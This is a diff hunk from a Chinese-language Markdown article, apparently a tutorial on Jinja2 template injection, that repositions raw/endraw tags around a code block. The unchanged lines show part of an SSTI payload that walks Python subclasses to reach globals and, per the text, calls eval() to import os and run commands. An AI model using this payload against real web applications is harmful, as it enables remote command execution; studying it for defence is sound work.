@@ -129,8 +129,8 @@ while 1:
 
 在 Jinja2 中模板 Payload 如下：
 
-```
 {% raw %}
+```
 {% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
   {% for b in c.__init__.func_globals.values() %}
@@ -142,8 +142,8 @@ while 1:
   {% endfor %}
 {% endif %}
 {% endfor %}
-{% endraw %}
 ```
+{% endraw %}
 
 使用该 Payload 作为示例代码二的执行参数（注意引号转义），成功执行会使用 `eval()` 函数动态载入 `os` 模块并执行命令：
 
